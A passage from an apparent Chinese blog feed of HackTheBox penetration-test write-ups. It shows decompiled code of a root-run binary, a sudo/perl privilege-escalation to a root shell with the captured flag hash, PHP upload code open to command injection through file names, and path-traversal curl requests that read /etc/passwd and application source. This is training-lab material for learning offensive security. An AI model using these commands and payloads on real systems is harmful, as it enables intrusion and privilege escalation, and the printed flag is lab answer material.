class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-28h]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *s; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> *command; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc != <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( getuid() )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(argv[<span class="number">2</span>], <span class="string">&quot;lDnxUysaQn&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Running... &quot;</span>);</span><br><span class="line">  stream = fopen(argv[<span class="number">2</span>], <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">  v5 = curl_easy_init();</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10002LL</span>, argv[<span class="number">1</span>]);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">10001LL</span>, stream);</span><br><span class="line">  curl_easy_setopt(v5, <span class="number">45LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)curl_easy_perform(v5) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Exiting... &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v6 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  s = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v6 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(s, v6 + <span class="number">1</span>, <span class="string">&quot;%s&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">  v7 = <span class="built_in">snprintf</span>(<span class="number">0LL</span>, <span class="number">0LL</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  command = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">snprintf</span>(command, v7 + <span class="number">1</span>, <span class="string">&quot;perl ./%s&quot;</span>, s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  curl_easy_cleanup(v5);</span><br><span class="line">  setuid(<span class="number">0</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  system(<span class="string">&quot;rm -f ./lDnxUysaQn&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>10002LL: This sets the URL to use for the request, and the value is passed in as the argv[1] parameter.</li><li>10001LL: This sets the output stream to use for the response, and the value is passed in as the stream parameter.</li><li>45LL: This sets the CURLOPT_VERBOSE option to 1, which causes libcurl to output verbose information about the request and response to the console.</li></ul><blockquote><p>Generated by ChatGPT</p></blockquote><p>大概意思是<code>curl argv[1] -o argv[2] -v</code></p><p>构造perl提权脚本并触发</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;exec &quot;/bin/bash&quot;;&#x27;</span> &gt; /tmp/bfl</span><br><span class="line">sudo -u root /usr/bin/binary file:///tmp/bfl lDnxUysaQn</span><br></pre></td></tr></table></figure><p>get root, 查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4a5dc64d395878aa52ec1bc85c579d67</span><br></pre></td></tr></table></figure><hr /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;upload&#x27;</span>]) &amp;&amp; <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]==<span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line"><span class="variable">$image_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$original_name</span> = <span class="variable">$image_name</span>;</span><br><span class="line"><span class="variable">$sanitised</span> = preg_replace(<span class="string">&#x27;/[^a-zA-Z0-9]+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$original_name</span>);</span><br><span class="line"><span class="variable">$image_type</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"><span class="variable">$image_name</span> = explode(<span class="string">&#x27;.&#x27;</span>,<span class="variable">$image_name</span>);</span><br><span class="line"><span class="variable">$folder</span>=time();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array(<span class="variable">$image_type</span>[<span class="string">&#x27;mime&#x27;</span>], <span class="variable">$allow_type</span>))&#123;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$width</span>, <span class="variable">$height</span>, <span class="variable">$mime</span>) = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$width</span>&gt;<span class="number">0</span> &amp;&amp; <span class="variable">$height</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">mkdir(<span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>);</span><br><span class="line"><span class="variable">$upload</span> = move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="string">&#x27;/var/www/uploads/&#x27;</span>.<span class="variable">$folder</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$upload</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27; has been uploaded. The analysis report can be viewed &lt;a href=analysed_images/&#x27;</span>.<span class="variable">$sanitised</span>.<span class="string">&#x27;.txt&gt;here&lt;/a&gt; &lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Please save this report as it will only be available for the next five minutes&lt;/p&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$folder</span> = <span class="string">&quot;/var/www/uploads/<span class="subst">$folder</span>&quot;</span>;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;cd <span class="subst">$folder</span> &amp;&amp; /opt/exiftool/exiftool * &gt; /var/www/html/analysed_images/<span class="subst">$sanitised</span>.txt&quot;</span>;</span><br><span class="line">shell_exec(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allowed&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Only JPEG and PNG are allow&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Error: Invalid File Type!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>意思是没必要用<code>`</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Inject</title>
    <link href="https://yoloyolo.top/2023/03/21/HackTheBox-Inject/"/>
    <id>https://yoloyolo.top/2023/03/21/HackTheBox-Inject/</id>
    <published>2023-03-20T16:58:23.000Z</published>
    <updated>2023-03-20T17:34:46.662Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_inject"><a class="markdownIt-Anchor" href="#hackthebox_inject"></a> HackTheBox_Inject</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.204</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.204</span><br><span class="line">Host is up (2.3s latency).</span><br><span class="line">Not shown: 613 filtered ports, 385 closed ports</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080&#x2F;tcp open  nagios-nsca Nagios NSCA</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>请求<code>http://10.10.11.204:8080/upload</code></p><p>上传文件后通过以下方法下载文件</p><p><code>http://10.10.11.204:8080/show_image?img=FILENAME</code></p><p>LFI</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:111:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:112::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:113::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:115::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">usbmux:x:111:46:usbmux daemon,,,:&#x2F;var&#x2F;lib&#x2F;usbmux:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">frank:x:1000:1000:frank:&#x2F;home&#x2F;frank:&#x2F;bin&#x2F;bash</span><br><span class="line">lxd:x:998:100::&#x2F;var&#x2F;snap&#x2F;lxd&#x2F;common&#x2F;lxd:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:113:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">phil:x:1001:1001::&#x2F;home&#x2F;phil:&#x2F;bin&#x2F;bash</span><br><span class="line">fwupd-refresh:x:112:118:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_laurel:x:997:996::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>可以列目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">libx32</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure><p>WEB代码如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/src/main/java/com/example/WebApp/user/UserController.java</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.WebApp.user;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.Resource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.io.UrlResource;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"><span class="keyword">import</span> javax.activation.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String UPLOADED_FOLDER = <span class="string">&quot;/var/www/WebApp/src/main/uploads/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">homePage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;homepage&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/register&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">signUpFormGET</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;under&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/upload&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">UploadFormGet</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/show_image&quot;, method = RequestMethod.GET)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity <span class="title">getImage</span><span class="params">(<span class="meta">@RequestParam(&quot;img&quot;)</span> String name)</span> </span>&#123;</span><br><span class="line">        String fileName = UPLOADED_FOLDER + name;</span><br><span class="line">        Path path = Paths.get(fileName);</span><br><span class="line">        Resource resource = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            resource = <span class="keyword">new</span> UrlResource(path.toUri());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedURLException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.ok().contentType(MediaType.IMAGE_JPEG).body(resource);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/upload&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Upload</span><span class="params">(<span class="meta">@RequestParam(&quot;file&quot;)</span> MultipartFile file, Model model)</span></span>&#123;</span><br><span class="line">        String fileName = StringUtils.cleanPath(file.getOriginalFilename());</span><br><span class="line">        <span class="keyword">if</span> (!file.isEmpty() &amp;&amp; !fileName.contains(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            String mimetype = <span class="keyword">new</span> MimetypesFileTypeMap().getContentType(fileName);</span><br><span class="line">            String type = mimetype.split(<span class="string">&quot;/&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">if</span> (type.equals(<span class="string">&quot;image&quot;</span>))&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Path path = Paths.get(UPLOADED_FOLDER+fileName);</span><br><span class="line">                    Files.copy(file.getInputStream(),path, StandardCopyOption.REPLACE_EXISTING);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;name&quot;</span>, fileName);</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Uploaded!&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Only image files are accepted!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            model.addAttribute(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;Please Upload a file!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/release_notes&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">changelog</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;change&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/blogs&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">blogPage</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;blog&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看<code>pom.xml</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.204:8080/show_image?img=../../../../../../var/www/WebApp/pom.xml</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 